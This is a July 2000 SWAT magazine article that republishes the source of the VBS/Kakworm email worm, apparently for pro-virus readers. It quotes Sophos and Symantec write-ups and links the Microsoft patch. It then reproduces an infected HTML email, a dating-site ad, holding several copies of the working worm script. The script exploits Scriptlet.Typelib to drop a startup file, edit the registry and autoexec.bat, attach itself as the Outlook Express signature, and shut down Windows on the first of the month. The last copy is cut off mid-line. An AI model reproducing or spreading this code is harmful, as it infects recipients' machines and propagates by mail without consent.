   _________  SWAT MAGAZINE ISSUE THIRTY ONE JULY 2000   __________
  /         \___________________________________________/          \
 /	             WScript.Kakworm Source Code                    \
/                       Presented by EXE-Gency                       \
----------------------------------------------------------------------- 
                      +---- --- -- -     - -- --- ----+
  -     -    -   -  - |  WScript.Kakworm Source Code  | -  -   -    -     -
  -     -    -   -  - |   Presented (not coded) by    | -  -   -    -     -
  -     -    -   -  - |           EXE-Gency           | -  -   -    -     -
  -     -    -   -  - |     (exegency@hotmail.com)    | -  -   -    -     -
                      +---- --- -- -     - -- --- ----+

    In SWAT magazine #30, XCESSwaste wrote a short article detailing 
computer
viruses which can be embedded as Scripts (usually JavaScript or Visual Basic
Script (VBS)) in HTML files. These HTML files can then be emailed to users
or posted to newsgroups and open opening, will result in execution of the
virus.
    An example of this kind of virus was detailed as 'The Bubble Boy Virus'
in XCESSwaste's article but I was unable to find the source code to this
virus in my collection. (Apparently the virus (or worm as it should
technically be refered to) was written by Zulu (www.coderz.net/zulu) who has
written a number of interesting non-ASM viruses.) Although I was unable to
find 'Bubble Boy' in my collection, I was able to find the Kakworm which
works in an extremely similar way to the Bubble Boy worm.
    I was going to write a short introduction about the worm, detailing how
it works and what it does but then I figured I could simply copy and paste
the specifications from various Anti-Virus websites.

PLEASE NOTE: I did not write this viruses and I have no idea who did. I hope
the original author does not mind having his source code republished as 
there
have been a number of posts to pro-virus newsgroups (such as
alt.comp.virus.source.code) with requests for the source code.

Once again you should goto the microsoft website:
http://www.microsoft.com/Security/Bulletins/ms99-032.asp and download the
patch which will prevent infection from Kakworm, Bubble Boy and similar
viruses/worms.

-----[Sophos 
description]----------------------------------------------------
-----[ http://www.sophos.com/virusinfo/analyses/vbskakworm.html 
]------------

Name: VBS/Kakworm
Aliases: Wscript.Kak.A
Type: Visual Basic Script worm
Detection: Detected by Sophos Anti-Virus.
Comments: VBS/Kakworm is a worm that exploits security vulnerabilities in
Microsoft Internet Explorer and Microsoft Outlook in a way similar to
VBS/BubbleBoy-A

Microsoft have released a patch to deal with this security problem which we
strongly recommend users install. For further information and to download 
the
patch please view Microsoft Security Bulletin (MS99-032)
<http://www.microsoft.com/Security/Bulletins/ms99-032.asp>;.

Users of non-Microsoft browsers or mailers are not affected.

The worm arrives embedded in an email message as the message HTML signature.
The recipient of the message cannot see any visible symptoms as there is no
displayable text in the signature.

If the user opens or previews the infected email message the worm drops file
KAK.HTA into the Windows start-up folder. KAK.HTA runs the next time Windows
is started, creates the C:\WINDOWS\KAK.HTM file and changes the Microsoft
Outlook Express registry settings so that the KAK.HTM is automatically
included in every outgoing message as a signature. The KAK.HTA also changes
the Windows registry that it includes the name of the worm file.

On the 1st of any month after 5 p.m. the worm displays the message
"Kagou-Anti-Kro$oft says not today" and runs Windows shutdown.

+-----------------------------------------+
| Memory Driver Error                     |
|-----------------------------------------|
| [ ! ] Kagou-Anti-Kro$oft says not today |
|                                         |
|                  [OK]                   |
+-----------------------------------------+

-----[Symantec 
description]--------------------------------------------------
-----[http://www.symantec.com/avcenter/venc/data/wscript.kakworm.html]-------

Wscript.KakWorm

VBS.KakWorm spreads using Microsoft Outlook Express. It attaches itself to
all outgoing messages via the Signature feature of Outlook Express and
Internet Explorer newsgroup reader.

The worm utilizes a known Microsoft Outlook Express security hole so that a
viral file is created on the system without having to run any attachment.
Simply reading the received email message will cause the virus to be placed
on the system.

Microsoft has patched this security hole. The patch is available from
Microsoft's website 
<http://www.microsoft.com/Security/Bulletins/ms99-032.asp>;.
If you have a patched version of Outlook Express, this worm will not work
automatically.

Also known as: VBS.Kak.Worm, Kagou-Anti-Krosoft
Category: WORM
Infection length: 4116 Bytes
Virus definitions: December 30, 1999

Threat assessment: Damage - MEDIUM
                   Distribution - HIGH
                   Wild - HIGH

Wild
Number of infections: More than 1000
Number of sites: 3-10
Geographical Distribution: High
Threat containment: Medium
Removal: Medium

Damage
Payload: Modifies the registry keys and shuts down Windows
Payload trigger: First of any month at 5pm
Degrades performance: Shuts Down Windows

Distribution
Size of Attachment: 4116 bytes
Target of infection: Microsoft Outlook Express, Internet Explorer Usenet
                     Newsreader

Technical description

The worm appends itself to the end of legitimate outgoing messages as a
signature. When receiving the message, the worm will automatically insert a
copy of itself into the appropriate StartUp directory of the Windows
operating system for both English and French language versions. The file
created is named KAK.HTA.

The worm utilizes a known Microsoft Outlook Express security hole,
Scriptlet.Typelib, so that a viral file is created on the system without
having to run any attachment. Simply reading the received email message will
cause the virus to be placed on the system.

Microsoft has patched this security hole. The patch is available from
Microsoft's website 
<http://www.microsoft.com/Security/Bulletins/ms99-032.asp>;.
If you have a patched version of Outlook Express, this worm will not work
automatically.

HTA files are executed by current versions of Microsoft Internet Explorer or
Netscape Navigator. The system must be rebooted for this file to be 
executed.
Once executed, the worm modifies the registry key:
HKCU/Identities/<Identity>/Software/Microsoft/Outlook/Express/5.0/signatures
in order to add its own signature file, which is the infected KAK.HTA file.
This causes all outgoing mail to be appended by the worm. In addition, the
registry key:
HKLM/Software/Microsoft/Windows/CurrentVersion/Run/cAgOu
is added which causes the worm to be executed each time the computer is
restarted.

Finally, if it is the first of the month and the hour is 17 (5:00pm), the
following message is displayed:

+-----------------------------------------+
| Memory Driver Error                     |
|-----------------------------------------|
| [ ! ] Kagou-Anti-Kro$oft says not today |
|                                         |
|                  [OK]                   |
+-----------------------------------------+

and Windows is sent the message to shutdown.

Removal:
Delete the following file: KAK.HTA
Delete the following registry key:
HKLM/Software/Microsoft/Windows/CurrentVersion/Run/cAgOu

-----------------------------------------------------------------------------

</table>

</td></tr>
<tr>
     <td valign=top>
     <table border=1 cellpadding=2 cellspacing=0 width=509>
     <tr>
     <td>

<table border=0 cellpadding=0 cellspacing=0>
<tr>
<td valign=top><tt><nobr>Subj:</nobr></tt></td>
<td width=5> </td>
<td valign=top><tt></tt></td>
</tr>

<tr>
<td valign=top><tt><nobr>Date:</nobr></tt></td>
<td width=5> </td>
<td valign=top><tt>Tue, 27 Jun 2000 11:47:28 AM Eastern Daylight 
Time</tt></td>
</tr>
<tr>
<td valign=top><tt><nobr>From:</nobr></tt></td>
<td width=5> </td>
<td valign=top><tt>"Senders Name" 
<Sender@hisISP.com></tt></td>
</tr>
<tr>
<td valign=top><tt><nobr>To:</nobr></tt></td>
<td width=5> </td>
<td valign=top><tt><myE-mail@myISP.com></tt></td>
</tr>
</table>
     </td>
     </tr>

<tr><td><pre>
<br>
<br>You are invited to place your personal ad and photos absolutely free of
<br>charge, forever, on the Internet's newest all Christian singles' 
website,
<br>ChristianDate.com!  To do so, simply click the hyperlink below.
<br>ChristianDate is so very easy to use, we believe that you will fall in 
love
<br>at first sight.  Try it out!  You have nothing to lose and everything to
<br>experience!
<br>
<br>http://www.christiandate.com
<br>
<br>God bless,
<br>ChristianDate.com<br><br>
</td></tr><tr><td><font face="Arial, Verdana, Helvetica" size="-1"><!DOCTYPE 
HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
<META content="MSHTML 5.00.2314.1000" name=GENERATOR>
<STYLE></STYLE>
</HEAD>
<BODY bgColor=#ffffff>
<DIV> </DIV>
<DIV>
<DIV>
</OBJECT></DIV><FONT face=Arial size=2><FONT face=Arial size=2><FONT
face=Arial size=2><FONT face=Arial size=2><FONT face=Arial size=2><FONT
face=Arial size=2><FONT face=Arial size=2>
<DIV><FONT size=2>
<DIV><FONT size=2>You are invited to place your personal ad and photos
absolutely free of charge, forever, on the Internet's newest all Christian
singles' website, ChristianDate.com!  To do so, simply click the 
hyperlink
below.  ChristianDate is so very easy to use, we believe that you will 
fall
in love at first sight.  Try it out!  You have nothing to lose and
everything to experience!</FONT></DIV>
<DIV> </DIV>
<DIV><FONT size=2><A
href="http://www.christiandate.com">http://www.christiandate.com<;/A><
;/FONT></DIV>
<DIV> </DIV>
<DIV><FONT size=2>God bless,</FONT></DIV>
<DIV><FONT size=2>ChristianDate.com</FONT></DIV></FONT></DIV></FONT>
<SCRIPT><!--
function sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc="Z<HTML><HEAD><TITLE>Driver 
Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" 
WINDOWSTATE=Minimize></"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' 
classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIPT>function 
sEr(){self.close();return true;}window.onerror=sEr;fs=new 
ActiveXObject('Scripting.FileSystemObject');wd='C:\\\\Windows\\\\';fl=fs.GetFolde
r(wd+'Applic~1\\\\Identities');sbf=fl.SubFolders;for(var 
mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new 
String(idd);idn=ids.slice(31);fic=idn.substring(1,9);kfr=wd+'MENUDÉ~1\\\\PROGRA~1
\\\\DÉMARR~1\\\\kak.hta';ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta';k2=w
d+'System\\\\'+fic+'.hta';kk=(fs.FileExists(kfr))?kfr:ken;aek='C:\\\\AE.KAK';aeb=
'C:\\\\Autoexec.bat';if(!fs.FileExists(aek)){re=/kak.hta/i;if(hO.commandLine.sear
ch(re)!=-1){f1=fs.GetFile(aeb);f1.Copy(aek);t1=f1.OpenAsTextStream(8);pth=(kk==kf
r)?wd+'MENUD~1\\\\PROGRA~1\\\\DMARR~1\\\\kak.hta':ken;t1.WriteLine('@echo 
off>'+pth);t1.WriteLine('del 
'+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(k2).Attr
ibutes=2;}t2=fs.CreateTextFile(wd+'kak.reg');t2.write('REGEDIT4');t2.WriteBlankLi
nes(2);ky='[HKEY 
CURRENT USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook 
Express\\\\5.0';sg='\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\"Default 
Signature\"=\"00000000\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\\\00000000
]');t2.WriteLine('\"name\"=\"Signature 
#1\"');t2.WriteLine('\"type\"=dword:00000002');t2.WriteLine('\"text\"=\"\"');t2.W
rite('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.WriteBlankLines(2);t2.Wr
iteLine(ky+']');t2.Write('\"Signature 
Flags\"=dword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY LOCAL 
MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]');t2.Write(
'\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"');t2.WriteBlank
Lines(2);t2.close();wsh.Run(wd+'Regedit.exe 
-s 
'+wd+'kak.reg');t3=fs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><BODY><DIV 
style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC 
id=scr></"+"OBJECT></"+"DIV>');t4=fs.OpenTextFile(k2,1);while(t4.Read(1)!='Z');t3.Writ
eLine('<SCRIPT><!--');t3.write('function 
sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc=\"Z');rs=t4.Read(3095);t4.close();r
d=/\\\\/g;re=/\"/g;rf=/<\\//g;rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').re
place(rf,'</"+"\"+\"');t3.WriteLine(rt+'\";la=(navigator.systemLanguage)?navigator
.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\
\\\Menu 
Démarrer\\\\\\\\Programmes\\\\\\\\Démarrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\
\\\\\\\Start 
Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=navigator.userAgent.toLo
werCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(a
gt.indexOf(\"msie 
5.\")!=-1))scr.write();');t3.write('// 
--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();fs.GetFile(wd+'ka
k.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg');d=new 
Date();if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft 
says not today !');wsh.Run(wd+'RUNDLL32.EXE 
user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc 
failed   
!]]%%%%%</"+"BODY></"+"HTML";la=(navigator.systemLanguage)?navigator.systemLanguage:
navigator.language;scr.Path=(la=="fr")?"C:\\windows\\Menu 
Démarrer\\Programmes\\Démarrage\\kak.hta":"C:\\windows\\Start 
Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((agt.
indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 
5.")!=-1))scr.write();
// --></SCRIPT>
</OBJECT></FONT>
<SCRIPT><!--
function sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc="Z<HTML><HEAD><TITLE>Driver 
Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" 
WINDOWSTATE=Minimize></"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' 
classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIPT>function 
sEr(){self.close();return true;}window.onerror=sEr;fs=new 
ActiveXObject('Scripting.FileSystemObject');wd='C:\\\\Windows\\\\';fl=fs.GetFolde
r(wd+'Applic~1\\\\Identities');sbf=fl.SubFolders;for(var 
mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new 
String(idd);idn=ids.slice(31);fic=idn.substring(1,9);kfr=wd+'MENUDÉ~1\\\\PROGRA~1
\\\\DÉMARR~1\\\\kak.hta';ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta';k2=w
d+'System\\\\'+fic+'.hta';kk=(fs.FileExists(kfr))?kfr:ken;aek='C:\\\\AE.KAK';aeb=
'C:\\\\Autoexec.bat';if(!fs.FileExists(aek)){re=/kak.hta/i;if(hO.commandLine.sear
ch(re)!=-1){f1=fs.GetFile(aeb);f1.Copy(aek);t1=f1.OpenAsTextStream(8);pth=(kk==kf
r)?wd+'MENUD~1\\\\PROGRA~1\\\\DMARR~1\\\\kak.hta':ken;t1.WriteLine('@echo 
off>'+pth);t1.WriteLine('del 
'+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(k2).Attr
ibutes=2;}t2=fs.CreateTextFile(wd+'kak.reg');t2.write('REGEDIT4');t2.WriteBlankLi
nes(2);ky='[HKEY 
CURRENT USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook 
Express\\\\5.0';sg='\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\"Default 
Signature\"=\"00000000\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\\\00000000
]');t2.WriteLine('\"name\"=\"Signature 
#1\"');t2.WriteLine('\"type\"=dword:00000002');t2.WriteLine('\"text\"=\"\"');t2.W
rite('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.WriteBlankLines(2);t2.Wr
iteLine(ky+']');t2.Write('\"Signature 
Flags\"=dword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY LOCAL 
MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]');t2.Write(
'\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"');t2.WriteBlank
Lines(2);t2.close();wsh.Run(wd+'Regedit.exe 
-s 
'+wd+'kak.reg');t3=fs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><BODY><DIV 
style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC 
id=scr></"+"OBJECT></"+"DIV>');t4=fs.OpenTextFile(k2,1);while(t4.Read(1)!='Z');t3.Writ
eLine('<SCRIPT><!--');t3.write('function 
sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc=\"Z');rs=t4.Read(3095);t4.close();r
d=/\\\\/g;re=/\"/g;rf=/<\\//g;rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').re
place(rf,'</"+"\"+\"');t3.WriteLine(rt+'\";la=(navigator.systemLanguage)?navigator
.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\
\\\Menu 
Démarrer\\\\\\\\Programmes\\\\\\\\Démarrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\
\\\\\\\Start 
Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=navigator.userAgent.toLo
werCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(a
gt.indexOf(\"msie 
5.\")!=-1))scr.write();');t3.write('// 
--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();fs.GetFile(wd+'ka
k.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg');d=new 
Date();if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft says 
not today !');wsh.Run(wd+'RUNDLL32.EXE 
user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc 
failed   
!]]%%%%%</"+"BODY></"+"HTML";la=(navigator.systemLanguage)?navigator.systemLanguage:
navigator.language;scr.Path=(la=="fr")?"C:\\windows\\Menu 
Démarrer\\Programmes\\Démarrage\\kak.hta":"C:\\windows\\Start 
Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((agt.
indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 
5.")!=-1))scr.write();
// --></SCRIPT>
</OBJECT></FONT>
<SCRIPT><!--
function sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc="Z<HTML><HEAD><TITLE>Driver 
Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" 
WINDOWSTATE=Minimize></"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' 
classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIPT>function 
sEr(){self.close();return true;}window.onerror=sEr;fs=new 
ActiveXObject('Scripting.FileSystemObject');wd='C:\\\\Windows\\\\';fl=fs.GetFolde
r(wd+'Applic~1\\\\Identities');sbf=fl.SubFolders;for(var 
mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new 
String(idd);idn=ids.slice(31);fic=idn.substring(1,9);kfr=wd+'MENUDÉ~1\\\\PROGRA~1
\\\\DÉMARR~1\\\\kak.hta';ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta';k2=w
d+'System\\\\'+fic+'.hta';kk=(fs.FileExists(kfr))?kfr:ken;aek='C:\\\\AE.KAK';aeb=
'C:\\\\Autoexec.bat';if(!fs.FileExists(aek)){re=/kak.hta/i;if(hO.commandLine.sear
ch(re)!=-1){f1=fs.GetFile(aeb);f1.Copy(aek);t1=f1.OpenAsTextStream(8);pth=(kk==kf
r)?wd+'MENUD~1\\\\PROGRA~1\\\\DMARR~1\\\\kak.hta':ken;t1.WriteLine('@echo 
off>'+pth);t1.WriteLine('del 
'+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(k2).Attr
ibutes=2;}t2=fs.CreateTextFile(wd+'kak.reg');t2.write('REGEDIT4');t2.WriteBlankLi
nes(2);ky='[HKEY 
CURRENT USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook 
Express\\\\5.0';sg='\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\"Default 
Signature\"=\"00000000\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\\\00000000
]');t2.WriteLine('\"name\"=\"Signature 
#1\"');t2.WriteLine('\"type\"=dword:00000002');t2.WriteLine('\"text\"=\"\"');t2.W
rite('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.WriteBlankLines(2);t2.Wr
iteLine(ky+']');t2.Write('\"Signature 
Flags\"=dword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY LOCAL 
MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]');t2.Write(
'\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"');t2.WriteBlank
Lines(2);t2.close();wsh.Run(wd+'Regedit.exe 
-s 
'+wd+'kak.reg');t3=fs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><BODY><DIV 
style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC 
id=scr></"+"OBJECT></"+"DIV>');t4=fs.OpenTextFile(k2,1);while(t4.Read(1)!='Z');t3.Writ
eLine('<SCRIPT><!--');t3.write('function 
sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc=\"Z');rs=t4.Read(3095);t4.close();r
d=/\\\\/g;re=/\"/g;rf=/<\\//g;rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').re
place(rf,'</"+"\"+\"');t3.WriteLine(rt+'\";la=(navigator.systemLanguage)?navigator
.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\
\\\Menu 
Démarrer\\\\\\\\Programmes\\\\\\\\Démarrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\
\\\\\\\Start 
Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=navigator.userAgent.toLo
werCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(a
gt.indexOf(\"msie 
5.\")!=-1))scr.write();');t3.write('// 
--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();fs.GetFile(wd+'ka
k.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg');d=new 
Date();if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft 
says not today !');wsh.Run(wd+'RUNDLL32.EXE 
user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc 
failed   
!]]%%%%%</"+"BODY></"+"HTML";la=(navigator.systemLanguage)?navigator.systemLanguage:
navigator.language;scr.Path=(la=="fr")?"C:\\windows\\Menu 
Démarrer\\Programmes\\Démarrage\\kak.hta":"C:\\windows\\Start 
Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((agt.
indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 
5.")!=-1))scr.write();
// --></SCRIPT>
</OBJECT></FONT>
<SCRIPT><!--
function sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc="Z<HTML><HEAD><TITLE>Driver 
Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" 
WINDOWSTATE=Minimize></"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' 
classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIPT>function 
sEr(){self.close();return true;}window.onerror=sEr;fs=new 
ActiveXObject('Scripting.FileSystemObject');wd='C:\\\\Windows\\\\';fl=fs.GetFolde
r(wd+'Applic~1\\\\Identities');sbf=fl.SubFolders;for(var 
mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new 
String(idd);idn=ids.slice(31);fic=idn.substring(1,9);kfr=wd+'MENUDÉ~1\\\\PROGRA~1
\\\\DÉMARR~1\\\\kak.hta';ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta';k2=w
d+'System\\\\'+fic+'.hta';kk=(fs.FileExists(kfr))?kfr:ken;aek='C:\\\\AE.KAK';aeb=
'C:\\\\Autoexec.bat';if(!fs.FileExists(aek)){re=/kak.hta/i;if(hO.commandLine.sear
ch(re)!=-1){f1=fs.GetFile(aeb);f1.Copy(aek);t1=f1.OpenAsTextStream(8);pth=(kk==kf
r)?wd+'MENUD~1\\\\PROGRA~1\\\\DMARR~1\\\\kak.hta':ken;t1.WriteLine('@echo 
off>'+pth);t1.WriteLine('del 
'+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(k2).Attr
ibutes=2;}t2=fs.CreateTextFile(wd+'kak.reg');t2.write('REGEDIT4');t2.WriteBlankLi
nes(2);ky='[HKEY 
CURRENT USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook 
Express\\\\5.0';sg='\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\"Default 
Signature\"=\"00000000\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\\\00000000
]');t2.WriteLine('\"name\"=\"Signature 
#1\"');t2.WriteLine('\"type\"=dword:00000002');t2.WriteLine('\"text\"=\"\"');t2.W
rite('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.WriteBlankLines(2);t2.Wr
iteLine(ky+']');t2.Write('\"Signature 
Flags\"=dword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY LOCAL 
MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]');t2.Write(
'\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"');t2.WriteBlank
Lines(2);t2.close();wsh.Run(wd+'Regedit.exe 
-s 
'+wd+'kak.reg');t3=fs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><BODY><DIV 
style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC 
id=scr></"+"OBJECT></"+"DIV>');t4=fs.OpenTextFile(k2,1);while(t4.Read(1)!='Z');t3.Writ
eLine('<SCRIPT><!--');t3.write('function 
sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc=\"Z');rs=t4.Read(3095);t4.close();r
d=/\\\\/g;re=/\"/g;rf=/<\\//g;rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').re
place(rf,'</"+"\"+\"');t3.WriteLine(rt+'\";la=(navigator.systemLanguage)?navigator
.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\
\\\Menu 
Démarrer\\\\\\\\Programmes\\\\\\\\Démarrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\
\\\\\\\Start 
Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=navigator.userAgent.toLo
werCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(a
gt.indexOf(\"msie 
5.\")!=-1))scr.write();');t3.write('// 
--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();fs.GetFile(wd+'ka
k.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg');d=new 
Date();if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft says 
not today !');wsh.Run(wd+'RUNDLL32.EXE 
user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc 
failed   
!]]%%%%%</"+"BODY></"+"HTML";la=(navigator.systemLanguage)?navigator.systemLanguage:
navigator.language;scr.Path=(la=="fr")?"C:\\windows\\Menu 
Démarrer\\Programmes\\Démarrage\\kak.hta":"C:\\windows\\Start 
Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((agt.
indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 
5.")!=-1))scr.write();
// --></SCRIPT>
</OBJECT></FONT>
<SCRIPT><!--
function sErr(){return 
true;}window.onerror=sErr;scr.Reset();scr.doc="Z<HTML><HEAD><TITLE>Driver 
Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" 
WINDOWSTATE=Minimize></"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' 
classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIPT>function 
sEr(){self.close();return true;}window.onerror=sEr;fs=new 
ActiveXObject('Scripting.FileSystemObject');wd='C:\\\\Windows\\\\';fl=fs.GetFolde
r(wd+'Applic~1\\\\Identities');sbf=fl.SubFolders;for(var 
mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new 
String(idd);idn=ids.slice(31);fic=idn.substring(1,9);kfr=wd+'MENUDÉ~1\\\\PROGRA~1
\\\\DÉMARR~1\\\\kak.hta';ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta';k2=w
d+'System\\\\'+fic+'.hta';kk=(fs.FileExists(kfr))?kfr:ken;aek='C:\\\\AE.KAK';aeb=
'C:\\\\Autoexec.bat';if(!fs.FileExists(aek)){re=/kak.hta/i;if(hO.commandLine.sear
ch(re)!=-1){f1=fs.GetFile(aeb);f1.Copy(aek);t1=f1.OpenAsTextStream(8);pth=(kk==kf
